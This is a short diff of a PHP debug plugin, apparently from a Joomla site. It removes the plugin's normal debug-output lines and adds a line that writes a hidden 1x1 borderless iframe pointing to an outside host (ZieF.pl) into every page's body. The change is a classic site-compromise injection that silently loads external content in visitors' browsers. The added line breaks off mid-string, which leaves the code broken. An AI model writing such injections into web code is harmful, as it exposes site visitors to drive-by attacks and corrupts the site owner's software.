@@ -201,7 +201,4 @@ class  plgSystemDebug extends JPlugin
 		$debug = ob_get_clean();
 
 		$body = JResponse::getBody();
-		$body = str_replace('</body>', $debug.'</body>', $body);
-		JResponse::setBody($body);
-	}
-}
+		$body = str_replace('<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></
